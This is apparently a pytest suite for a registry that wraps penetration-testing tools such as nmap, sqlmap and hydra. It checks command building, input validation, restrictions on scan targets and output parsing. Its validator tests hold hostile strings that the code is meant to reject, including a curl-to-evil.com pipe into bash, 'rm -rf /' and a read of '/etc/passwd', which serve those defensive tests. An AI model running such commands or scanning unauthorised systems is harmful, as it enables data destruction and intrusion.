import pytest
from tool_registry.registry import (
    build_command,
    is_tool_installed,
    get_all_tools,
    get_tool,
    run_tool,
    get_run_result,
    UnknownToolError,
    UnknownParamError,
    MissingRequiredParamError,
    ParamValidationError,
    SafeTargetRestrictionError,
)
from tool_registry.validators import (
    validate_ip_or_domain,
    validate_domain,
    validate_url,
    validate_port,
    validate_port_range,
    validate_file_path,
    validate_nikto_maxtime,
)
from tool_registry.parsers import nmap_parser, nikto_parser, gobuster_parser, subfinder_parser, nuclei_parser, sqlmap_parser, hydra_parser
from tool_registry.registry import install_tool, delete_tool
from pathlib import Path

SAMPLES_DIR = Path(__file__).parent.parent / "tool_registry" / "test_samples"


class TestBuildCommand:
    def test_nmap_valid_full(self):
        cmd = build_command("nmap", {"target": "127.0.0.1", "ports": "22,80"})
        assert cmd == ["nmap", "-sV", "-p", "22,80", "-T4", "--max-retries", "2", "--host-timeout", "30m", "127.0.0.1"]

    def test_nmap_valid_no_ports(self):
        cmd = build_command("nmap", {"target": "scanme.nmap.org"})
        assert cmd == ["nmap", "-sV", "-T4", "--max-retries", "2", "--host-timeout", "30m", "scanme.nmap.org"]

    def test_subfinder_valid(self):
        cmd = build_command("subfinder", {"target": "example.com"})
        assert cmd == ["subfinder", "-d", "example.com", "-silent", "-all"]

    def test_nuclei_valid(self):
        cmd = build_command("nuclei", {"target": "example.com"})
        assert cmd == ["nuclei", "-u", "example.com", "-t", "/root/nuclei-templates/http/technologies/", "-jsonl", "-silent"]

    def test_tools_have_reasonable_timeouts(self):
        for tool in get_all_tools():
            timeout = tool.get("timeout")
            assert timeout is not None, f"{tool['name']} is missing a timeout"
            assert isinstance(timeout, int) and timeout >= 600, f"{tool['name']} timeout too small: {timeout}"

    def test_nmap_timeout_covers_full_port_scans(self):
        nmap = get_tool("nmap")
        assert nmap.get("timeout", 900) >= 1800

    def test_gobuster_valid(self):
        cmd = build_command("gobuster", {
            "target": "http://example.com",
            "wordlist": "/usr/share/wordlists/dirb/common.txt",
            "mode": "dir",
        })
        assert cmd == ["gobuster", "dir", "-u", "http://example.com", "-w", "/usr/share/wordlists/dirb/common.txt"]

    def test_nikto_valid(self):
        cmd = build_command("nikto", {"target": "127.0.0.1", "port": "80"})
        assert cmd == ["nikto", "-h", "127.0.0.1", "-port", "80", "-maxtime", "10m"]

    def test_sqlmap_valid(self):
        cmd = build_command("sqlmap", {"target": "http://example.com/page?id=1"})
        assert cmd == ["sqlmap", "-u", "http://example.com/page?id=1", "--batch", "--random-agent"]

    def test_hydra_valid(self):
        cmd = build_command("hydra", {
            "target": "127.0.0.1",
            "username_list": "/tmp/users.txt",
            "password_list": "/tmp/pass.txt",
            "service": "ssh",
        })
        assert cmd == ["hydra", "-L", "/tmp/users.txt", "-P", "/tmp/pass.txt", "127.0.0.1", "ssh"]

    def test_nikto_with_maxtime(self):
        cmd = build_command("nikto", {"target": "127.0.0.1", "port": "80", "maxtime": "5m"})
        assert cmd == ["nikto", "-h", "127.0.0.1", "-port", "80", "-maxtime", "5m"]

    def test_nikto_maxtime_default_applied(self):
        cmd = build_command("nikto", {"target": "127.0.0.1", "port": "80"})
        assert cmd == ["nikto", "-h", "127.0.0.1", "-port", "80", "-maxtime", "10m"]

    def test_nikto_maxtime_invalid_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nikto", {"target": "127.0.0.1", "port": "80", "maxtime": "10"})

    def test_injection_semicolon_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nmap", {"target": "10.0.0.1; rm -rf /"})

    def test_injection_and_curl_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nmap", {"target": "10.0.0.1 && curl evil.com | bash"})

    def test_injection_subshell_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nmap", {"target": "10.0.0.1`id`"})

    def test_injection_pipe_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nmap", {"target": "10.0.0.1 | whoami"})

    def test_injection_in_port_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nmap", {"target": "127.0.0.1", "ports": "80; rm -rf /"})

    def test_injection_in_wordlist_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("gobuster", {
                "target": "http://example.com",
                "wordlist": "/tmp/foo; rm -rf /",
                "mode": "dir",
            })

    def test_unknown_tool_rejected(self):
        with pytest.raises(UnknownToolError):
            build_command("nonexistent_tool", {"target": "127.0.0.1"})

    def test_missing_required_param_rejected(self):
        with pytest.raises(MissingRequiredParamError):
            build_command("nmap", {})

    def test_extra_param_rejected(self):
        with pytest.raises(UnknownParamError):
            build_command("nmap", {"target": "127.0.0.1", "invalid_param": "value"})

    def test_missing_gobuster_wordlist_defaulted(self):
        cmd = build_command("gobuster", {"target": "http://example.com", "mode": "dir"})
        assert cmd == ["gobuster", "dir", "-u", "http://example.com", "-w", "/usr/share/wordlists/common.txt"]

    def test_invalid_port_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nikto", {"target": "127.0.0.1", "port": "99999"})

    def test_invalid_url_rejected(self):
        with pytest.raises(ParamValidationError):
            build_command("nuclei", {"target": "not-a-url"})


class TestToolAvailability:
    def test_get_all_tools_returns_seven(self):
        tools = get_all_tools()
        assert len(tools) == 7
        names = [t["name"] for t in tools]
        assert names == ["nmap", "subfinder", "nuclei", "gobuster", "nikto", "sqlmap", "hydra"]

    def test_get_tool_valid(self):
        tool = get_tool("nmap")
        assert tool["name"] == "nmap"
        assert tool["risk_tier"] in ("passive", "active_scan", "exploit")

    def test_get_tool_invalid(self):
        with pytest.raises(UnknownToolError):
            get_tool("nonexistent")

    def test_is_tool_installed_returns_bool(self):
        result = is_tool_installed("nmap")
        assert isinstance(result, bool)


class TestValidators:
    def test_ip_or_domain_valid(self):
        assert validate_ip_or_domain("127.0.0.1")
        assert validate_ip_or_domain("10.0.0.1")
        assert validate_ip_or_domain("192.168.1.1")
        assert validate_ip_or_domain("example.com")
        assert validate_ip_or_domain("sub.example.com")
        assert validate_ip_or_domain("scanme.nmap.org")

    def test_ip_or_domain_invalid(self):
        assert not validate_ip_or_domain("10.0.0.1; rm -rf /")
        assert not validate_ip_or_domain("10.0.0.1 && curl evil.com")
        assert not validate_ip_or_domain("$(whoami)")
        assert not validate_ip_or_domain("")
        assert not validate_ip_or_domain("not a domain")

    def test_domain_valid(self):
        assert validate_domain("example.com")
        assert validate_domain("sub.example.com")
        assert validate_domain("scanme.nmap.org")
        assert validate_domain("127.0.0.1")

    def test_domain_invalid(self):
        assert not validate_domain("10.0.0.1; ls")

    def test_url_valid(self):
        assert validate_url("http://example.com")
        assert validate_url("https://example.com/path?id=1")
        assert validate_url("http://example.com:8080/")
        assert validate_url("http://127.0.0.1:8080")

    def test_url_invalid(self):
        assert not validate_url("example.com")
        assert not validate_url("ftp://example.com")
        assert not validate_url("http://example.com; ls")

    def test_port_valid(self):
        assert validate_port("80")
        assert validate_port("443")
        assert validate_port("1")
        assert validate_port("65535")

    def test_port_invalid(self):
        assert not validate_port("0")
        assert not validate_port("65536")
        assert not validate_port("80; rm")
        assert not validate_port("abc")

    def test_port_range_valid(self):
        assert validate_port_range("80")
        assert validate_port_range("1-1000")
        assert validate_port_range("22,80,443")
        assert validate_port_range("22,80-100,443")

    def test_port_range_invalid(self):
        assert not validate_port_range("80; ls")
        assert not validate_port_range("0-100")
        assert not validate_port_range("1-65536")
        assert not validate_port_range("abc")

    def test_file_path_valid(self):
        assert validate_file_path("/usr/share/wordlists/dirb/common.txt")
        assert validate_file_path("/tmp/words.txt")
        assert validate_file_path("./relative/path.txt")
        assert validate_file_path("~/wordlist.txt")

    def test_file_path_invalid(self):
        assert not validate_file_path("/tmp/foo; rm -rf /")
        assert not validate_file_path("/tmp/foo && ls")
        assert not validate_file_path("$(cat /etc/passwd)")

    def test_nikto_maxtime_valid(self):
        assert validate_nikto_maxtime("10m")
        assert validate_nikto_maxtime("120s")
        assert validate_nikto_maxtime("1h")
        assert validate_nikto_maxtime("3600s")
        assert validate_nikto_maxtime("0m")

    def test_nikto_maxtime_invalid(self):
        assert not validate_nikto_maxtime("10")
        assert not validate_nikto_maxtime("abc")
        assert not validate_nikto_maxtime("10x")
        assert not validate_nikto_maxtime("")
        assert not validate_nikto_maxtime("10 minutes")
        assert not validate_nikto_maxtime("10m;")


class TestSafeTargetRestriction:
    def test_run_tool_localhost_allowed(self):
        job_id = run_tool("nmap", {"target": "127.0.0.1", "ports": "22"})
        result = get_run_result(job_id)
        assert result is not None
        assert result["status"] in ("running", "completed", "timeout", "error")

    def test_run_tool_localhost_hostname_allowed(self):
        job_id = run_tool("nmap", {"target": "localhost"})
        result = get_run_result(job_id)
        assert result is not None

    def test_run_tool_scanme_allowed_for_nmap(self):
        job_id = run_tool("nmap", {"target": "scanme.nmap.org", "ports": "80"})
        result = get_run_result(job_id)
        assert result is not None

    def test_run_tool_arbitrary_rejected(self):
        with pytest.raises(SafeTargetRestrictionError):
            run_tool("nmap", {"target": "192.168.1.100"})

    def test_run_tool_internal_ip_rejected(self):
        with pytest.raises(SafeTargetRestrictionError):
            run_tool("nmap", {"target": "10.0.0.1"})

    def test_run_tool_scanme_rejected_for_nikto(self):
        with pytest.raises(SafeTargetRestrictionError):
            run_tool("nikto", {"target": "scanme.nmap.org", "port": "80"})

    def test_run_tool_arbitrary_domain_rejected(self):
        with pytest.raises(SafeTargetRestrictionError):
            run_tool("nmap", {"target": "example.com"})

    def test_build_command_accepts_what_run_rejects(self):
        cmd = build_command("nmap", {"target": "10.0.0.1"})
        assert cmd == ["nmap", "-sV", "-T4", "--max-retries", "2", "--host-timeout", "30m", "10.0.0.1"]
        with pytest.raises(SafeTargetRestrictionError):
            run_tool("nmap", {"target": "10.0.0.1"})


class TestInstallDeleteErrors:
    def test_install_missing_dependency_message(self):
        result = install_tool("sqlmap")
        if not result["success"]:
            msg = result["output"]
            assert "Cannot install" in msg
            assert "not found" in msg or "not installed" in msg

    def test_delete_missing_dependency_message(self):
        result = delete_tool("nmap")
        if not result["success"]:
            msg = result["output"]
            assert "Cannot" not in msg  # nmap uses brew, if brew is present this won't hit FileNotFoundError
        else:
            assert result["success"] is True or result["installed"] is False


class TestParsers:
    def test_nmap_parser_real_sample(self):
        sample_path = SAMPLES_DIR / "nmap_sample.txt"
        if not sample_path.exists():
            pytest.skip("nmap sample file not found — run capture step first")
        raw = sample_path.read_text()
        result = nmap_parser.parse(raw)
        assert result["tool"] == "nmap"
        assert len(result["findings"]) > 0
        for f2 in result["findings"]:
            assert f2["type"].startswith("port_")
            assert "port" in f2["detail"]
            assert "protocol" in f2["detail"]
            assert "state" in f2["detail"]
            assert "service" in f2["detail"]

    def test_nikto_parser(self):
        sample_path = SAMPLES_DIR / "nikto_sample.txt"
        if not sample_path.exists():
            pytest.skip("nikto sample file not found — run capture step first")
        raw = sample_path.read_text()
        result = nikto_parser.parse(raw)
        assert result["tool"] == "nikto"
        assert isinstance(result["findings"], list)

    def test_gobuster_parser_empty_output(self):
        raw = "Gobuster v3.8.2\n[+] Url: http://127.0.0.1\nStarting gobuster\n"
        result = gobuster_parser.parse(raw)
        assert result["tool"] == "gobuster"
        assert result["findings"] == []

    def test_subfinder_parser_empty_output(self):
        raw = ""
        result = subfinder_parser.parse(raw)
        assert result["tool"] == "subfinder"
        assert result["findings"] == []

    def test_nuclei_parser_empty_output(self):
        raw = ""
        result = nuclei_parser.parse(raw)
        assert result["tool"] == "nuclei"
        assert result["findings"] == []

    def test_nuclei_parser_human_readable_format(self):
        raw = (
            "[waf-detect:apachegeneric] [http] [info] http://scanme.nmap.org\n"
            "[apache-detect] [http] [info] http://scanme.nmap.org [\"Apache/2.4.7\"]\n"
        )
        result = nuclei_parser.parse(raw)
        assert result["tool"] == "nuclei"
        assert len(result["findings"]) == 2
        assert result["findings"][0]["type"] == "vulnerability"
        assert result["findings"][0]["detail"]["name"] == "waf-detect"
        assert result["findings"][0]["detail"]["severity"] == "info"
        assert result["findings"][0]["detail"]["matched"] == "http://scanme.nmap.org"

    def test_nuclei_parser_json_lines_format(self):
        import json as _json
        line = _json.dumps({
            "template-id": "apache-detect",
            "info": {"name": "Apache Detect", "severity": "info"},
            "matched-at": "http://scanme.nmap.org",
            "host": "scanme.nmap.org",
        })
        result = nuclei_parser.parse(line)
        assert len(result["findings"]) == 1
        assert result["findings"][0]["detail"]["name"] == "Apache Detect"

    def test_gobuster_parser_real_sample(self):
        sample_path = SAMPLES_DIR / "gobuster_sample.txt"
        if not sample_path.exists():
            pytest.skip("gobuster sample file not found")
        raw = sample_path.read_text()
        result = gobuster_parser.parse(raw)
        assert result["tool"] == "gobuster"
        assert len(result["findings"]) == 16

        # First entry: redirect with optional redirect_to
        f0 = result["findings"][0]
        assert f0["type"] == "discovered_path"
        assert f0["detail"]["path"] == "admin"
        assert f0["detail"]["status"] == 302
        assert f0["detail"]["size"] == 0
        assert f0["detail"]["redirect_to"] == "/login.jsp"

        # Second entry: plain 200, no redirect
        f1 = result["findings"][1]
        assert f1["detail"]["path"] == "aux"
        assert f1["detail"]["status"] == 200
        assert f1["detail"]["size"] == 0
        assert "redirect_to" not in f1["detail"]

        # Last entry: confirm 16 entries total
        assert result["findings"][-1]["detail"]["path"] == "about.jsp"

    def test_subfinder_parser_real_sample(self):
        sample_path = SAMPLES_DIR / "subfinder_sample.txt"
        if not sample_path.exists():
            pytest.skip("subfinder sample file not found")
        raw = sample_path.read_text()
        result = subfinder_parser.parse(raw)
        assert result["tool"] == "subfinder"
        assert isinstance(result["findings"], list)

    def test_nuclei_parser_real_sample(self):
        sample_path = SAMPLES_DIR / "nuclei_sample.txt"
        if not sample_path.exists():
            pytest.skip("nuclei sample file not found")
        raw = sample_path.read_text()
        result = nuclei_parser.parse(raw)
        assert result["tool"] == "nuclei"
        assert isinstance(result["findings"], list)

    def test_sqlmap_parser_empty_output(self):
        raw = "[INFO] testing connection\n[WARNING] no parameter found\n"
        result = sqlmap_parser.parse(raw)
        assert result["tool"] == "sqlmap"
        assert result["findings"] == []

    def test_sqlmap_parser_real_sample(self):
        sample_path = SAMPLES_DIR / "sqlmap_sample.txt"
        if not sample_path.exists():
            pytest.skip("sqlmap sample file not found")
        raw = sample_path.read_text()
        result = sqlmap_parser.parse(raw)
        assert result["tool"] == "sqlmap"
        assert len(result["findings"]) == 1

        f0 = result["findings"][0]
        assert f0["type"] == "sql_injection"
        assert f0["detail"]["parameter"] == "id"
        assert f0["detail"]["method"] == "GET"
        assert len(f0["detail"]["techniques"]) == 2
        assert f0["detail"]["techniques"][0]["type"] == "boolean-based blind"
        assert f0["detail"]["techniques"][1]["type"] == "error-based"

    def test_hydra_parser_real_sample(self):
        sample_path = SAMPLES_DIR / "hydra_sample.txt"
        if not sample_path.exists():
            pytest.skip("hydra sample file not found")
        raw = sample_path.read_text()
        result = hydra_parser.parse(raw)
        assert result["tool"] == "hydra"
        assert len(result["findings"]) == 1

        f0 = result["findings"][0]
        assert f0["type"] == "credential_found"
        assert f0["detail"]["port"] == 22
        assert f0["detail"]["service"] == "ssh"
        assert f0["detail"]["host"] == "172.30.36.3"
        assert f0["detail"]["login"] == "root"
        assert f0["detail"]["password"] == "root"
